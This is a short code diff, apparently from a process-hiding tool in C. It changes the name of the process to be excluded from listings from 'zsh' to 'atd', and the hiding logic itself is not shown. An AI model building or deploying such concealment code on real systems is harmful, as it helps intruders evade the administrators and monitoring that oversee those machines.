@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "zsh";
+static const char* process_to_filter = "atd";
 
 /*
  * Get a directory name given a DIR* handle
